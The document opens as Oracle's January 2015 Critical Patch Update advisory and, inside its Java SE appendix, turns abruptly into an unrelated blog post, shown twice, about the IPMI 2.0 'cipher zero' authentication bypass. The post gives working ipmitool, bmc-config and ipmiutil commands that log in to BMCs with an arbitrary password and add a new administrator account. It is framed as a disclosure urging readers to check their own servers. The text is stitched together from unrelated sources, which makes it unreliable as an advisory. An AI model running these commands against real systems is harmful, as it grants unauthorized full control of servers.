# Oracle Critical Patch Update Advisory - January 2015

## Oracle Critical Patch Update Advisory - January 2015

### Description

A Critical Patch Update (CPU) is a collection of patches for multiple security vulnerabilities. Critical Patch Update patches are usually cumulative, but each advisory describes only the security fixes added since the previous Critical Patch Update advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security fixes. Please refer to:

[Critical Patch Updates and Security Alerts](/security-alerts/) for information about Oracle Security Advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released fixes. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore *strongly* recommends that customers remain on actively-supported versions and apply Critical Patch Update fixes *without* delay.**

This Critical Patch Update contains 169 new security fixes across the product families listed below. Please note that a blog entry summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at <https://blogs.oracle.com/security>.

Please note that on October 16, 2014, Oracle released information for  [CVE-2014-3566 "POODLE"](/security-alerts/poodlecve-2014-3566.html) .Customers of affected Oracle products are strongly advised to apply the fixes and/or configuration steps that were announced for CVE-2014-3566 in addition to the fixes announced in this CPU.

This Critical Patch Update advisory is also available in an XML format that conforms to the Common Vulnerability Reporting Format (CVRF) version 1.1. More information about Oracle's use of CVRF is available at:  [https://www.oracle.com/security-alerts/cpufaq.html#CVRF](/security-alerts/cpufaq.html#CVRF).

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly fixed by the patches associated with this advisory. Risk matrices for previous security fixes can be found in  [previous Critical Patch Update advisories](/security-alerts/). An English text version of the risk matrices provided in this document is available  [here](/security-alerts/cpujan2015verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](//cve.mitre.org/) which is a unique identifier for a vulnerability. A vulnerability that affects multiple products will appear with the same**CVE#** in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 2.0 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS 2.0). Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update (CPU). Oracle does not disclose information about the security analysis, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see  [Oracle vulnerability disclosure policies](https://www.oracle.com/corporate/security-practices/assurance/vulnerability/disclosure.html).

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the only variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply CPU fixes as soon as possible**. Until you apply the CPU fixes, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security fixes as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security fixes announced in this CPU, please review  [previous Critical Patch Update advisories](/security-alerts/) to determine appropriate actions.

### Product Dependencies

Oracle products may have dependencies on other Oracle products. Hence security vulnerability fixes announced in this Critical Patch Update may affect one or more dependent Oracle products. For details regarding these dependencies and how to apply patches to dependent products, please refer to Patch Set Update and Critical Patch Update January 2015 Availability Document,  [My Oracle Support Note 1942215.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=1942215.1).

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the [Lifetime Support Policy](https://www.oracle.com/support/lifetime-support/) . We recommend that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Supported Database, Fusion Middleware, Oracle Enterprise Manager Base Platform (formerly "Oracle Enterprise Manager Grid Control") and Collaboration Suite products are patched in accordance with the Software Error Correction Support Policy explained in  [My Oracle Support Note 209768.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=209768.1) .Please review the  [Technical Support Policies](https://www.oracle.com/support/policies.html) for further guidelines regarding support policies and phases of support.

### Products in Extended Support

Patches released through the Critical Patch Update program are available to customers who have Extended Support under the [Lifetime Support Policy](https://www.oracle.com/support/lifetime-support/) . Customers must have a valid Extended Support service contract to download patches released through the Critical Patch Update program for products in the Extended Support Phase.

### Appendix - Oracle Java SE

#### Oracle Java SE Executive Summary

This Critical Patch Update contains 19 new security fixes for Oracle Java SE. 14 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. The English text form of this Risk Matrix can be found  [here](https:///security-alerts/cpujan2015verbose.html#JAVA).

The CVSS scores below assume that a user running a Java applet or Java Web Start application has administrator privileges (typical on Windows). When the user does not run with administrator privileges (typical on Solaris and Linux), the corresponding CVSS impact scores for Confidentiality, Integrity, and Availability are "Partial" instead of "Complete", lowering the CVSS Base Score. For example, a Base Score of 10.0 becomes 7.5.

Users should only use the default Java Plug-in and Java Web Start from the latest JDK or JRE 7 and 8 releases.

[My Oracle Support Note 360870.1](https:///https%3A//support.oracle.com/epmos/faces/DocumentDisplay?id=360870.1) explains the impact of Java security vulnerabilities on Oracle products that include an Oracle Java SE JDK or JRE.

```

Many may know thisâ¦ but it came as a bit of news to me to actually *see* it in
the wild.  I came across this while working on my little audit tool of the
config stuff I'd posted here.

The short version - everyone here probably knows that Cipher Zero is the first
Cipher in the IPMI 2.0 spec.  It allows you to authenticate to IPMI without a
password - in other words, it's really no cipher at all, or the un-cipher.  It
removes all security from IPMI.  But who cares, really?  Surely vendors
wouldn't turn this on by default, would they?  Wellâ¦ it's enabled on my Dell
(iDRAC 6), HP (iLO 3), and Supermicro.  That's all the systems I have access
to, presumably there are more.

Longer version: let's see, to belabor the obvious, to execute an IPMI command,
you can use good ol' bmc-config with the proper authentication:

        $ bmc-config -D LAN_2_0 -I 0  -v -u root -p calvin -h 10.0.0.1
--checkout|grep -i cipher_suite_id_0
        Maximum_Privilege_Cipher_Suite_Id_0           Administrator

You know, that line of output is not good. How not good is "not good"? Well,
let's try it again... this time with "FluffyWabbit" as the password:

        $ bmc-config -D LAN_2_0 -I 0  -v -u root -p FluffyWabbit -h 10.0.0.1
--checkout|grep -i cipher_suite_id_0
        Maximum_Privilege_Cipher_Suite_Id_0           Administrator

I guess this is neat. Or sad.  Or something.  You can try other passwords to
verify FluffyWabbit isn't some vendor hardcoded backdoor ;)

I believe that IBM, as of the M2/Nehalem generation, has essentially abolished
cipher zero through the efforts of Jarred B Johnson (kudos to both!) I'm not
sure who else still has this going onâ¦ but you might check your own boxes.  I'd
love to hear about the vendors that do have this on or off by default.

Disclaimer - various versions of the IPMI utilities - including bmc-config -
do not work correctly with cipher 0 and will fail; this misled me early on in
testing my own boxes. The latest version of freeipmi seems to work on all the
ones I've tested, at least; make sure you have downloaded the latest copy and
try this to verify good ol' cipher 0 is still around.

Most commands say they support cipher zero, but ensure you have the latest
version, because bugs abound out there in the tools and/or in the BMCs.  Here's
a couple of more ways to see if this is enabled:

        $ ipmitool -I lanplus -C 0 -H 10.0.0.1 -U admin -P FluffyWabbit lan
print

        $ ipmiutil lan  -J 0  -N 10.0.0.1 -U admin -P FluffyBunny

Ipmiutil has a nice printing of the results - anything in the RMCP+ line that
looks zero-ish is bad :)

     $ ipmitool -I lanplus -C 0 -H 10.0.0.1 -U root -P calvin  lan print

The Brain-Death in the IPMI Specification

The Infamous Cipher 0

It's hard to imagine someone thinking this up. The IPMI 2.0 Specification
introduced cryptography into IPMI. Perhaps someone thought... well,
cryptography is hard. So let's put in a way to completely sidestep not
only cryptography, but authentication as well. This is the essence
of cipher zero - it's really no cipher at all, or the un-cipher.
It does require IPMI is turned on, as well as a valid account that can
be authenticated to, you simply don't need the authentication. Vendors
always have a default account, however, so that makes things a bit easier.

So let's see, to belabor the obvious, to execute an IPMI command, you
can use good ol' bmc-config with the proper authentication:
$ **bmc-config -D LAN\_2\_0 -I 0 -v -u root -p calvin -h 10.0.0.1 --checkout|grep -i cipher\_suite\_id\_0**

Maximum\_Privilege\_Cipher\_Suite\_Id\_0 Administrator

You know, that line of output is not good. How not good is "not good"? Well, let's try it again... this time with "FluffyWabbit" as the password:

$ **bmc-config -D LAN\_2\_0 -I 0 -v -u root -p FluffyWabbit -h 10.0.0.1 --checkout|grep -i cipher\_suite\_id\_0**

Maximum\_Privilege\_Cipher\_Suite\_Id\_0 Administrator

I guess this is neat. Or sad. Or something. You can try other passwords
to verify FluffyWabbit isn't some vendor hardcoded backdoor ;)

That said, so what? What's the worst that can happen? Ok... well,
let's try this on my Dell iDRAC. It has an account called root, and
a password that we don't know.

# this shouldn't work

$ **ipmitool -H 10.0.0.1 -U root -P calvin chassis status**

Activate Session command failed

Error: Unable to establish LAN session

Error sending Get Self Test command

# this really shouldn't either, but does.

$ **ipmitool -I lanplus -C 0 -H 10.0.0.1 -U root -P FluffyWabbit chassis status**

Note you have to explicitly say you want version 2 (e.g. lanplus, in this case),
as well as cipher zero ("-C 0".)

Still unimpressed, I know. Well, onwards. Let's create an IPMI account,
give it a password, administrator rights, and enable it. I'll use both
ipmitool and bmc-config; the former is great for illustrating settings,
while the latter is very simple to understand the output.

# one account is there now

**ipmitool -I lanplus -C 0 -H 10.0.0.1 -U admin -P FluffyWabbit user list**

ID Name Callin Link Auth IPMI Msg Channel Priv Limit

2 admin true true true ADMINISTRATOR

$ **cat bozo.txt**

# add a user with administrative rights

# et tu, bmc-config?

$ **bmc-config -v -u root -p calvin -h 10.0.0.1 --commit -f bozo.txt**

# voila

$**ipmitool -I lanplus -C 0 -H 10.0.0.1 -U admin -P FluffyWabbit user list**

ID Name Callin Link Auth IPMI Msg Channel Priv Limit

2 admin true true true ADMINISTRATOR

9 bozo true true true ADMINISTRATOR

# take the new account out for a test drive; no cheating with C0 this time

$**ipmitool -H 10.0.0.1 -U bozo -P theclown user list**

ID Name Callin Link Auth IPMI Msg Channel Priv Limit

2 admin true true true ADMINISTRATOR

9 bozo true true true ADMINISTRATOR

Since IPMI administrative access grants you god powers on the server,
it's a bit problematic that it's so easy to get admin rights.

I believe that IBM, as of the M2/Nehalem generation, has essentially
abolished cipher zero through the efforts of Jarred B Johnson (kudos
to both!) Dell told me that it was no longer on by default in the most
recent version of iDRAC. I'm not sure who else still has this going on -
but you might check your own boxes. Drop me a line if you hear your
vendor has this on or off by default.

#### Disclaimer

Various versions of the IPMI utilities - including bmc-config - do not
work correctly with cipher 0 and will fail; this misled me early on in
testing my own boxes. The latest version of freeipmi seems to work on
all the ones I've tested, at least; make sure you have downloaded the
latest copy and try this to verify good ol' cipher 0 is still around.
Most commands say they support cipher zero, but ensure you have the
latest version, because bugs abound out there in the tools and/or in
the BMCs. Here's a couple of more ways to see if this is enabled:

$ **ipmitool -I lanplus -C 0 -H 10.0.0.1 -U admin -P FluffyWabbit lan print**

$ **ipmiutil lan -J 0 -N 10.0.0.1 -U admin -P FluffyBunny**

Ipmiutil has a nice printing of the results - anything in the RMCP+
line (in red below) looks zero-ish is bad :) Cipher Privs refers to the
maximum privilege the account can have using a given cipher suite.

$ **ipmitool -I lanplus -C 0 -H 10.0.0.1 -U root -P calvin lan print**
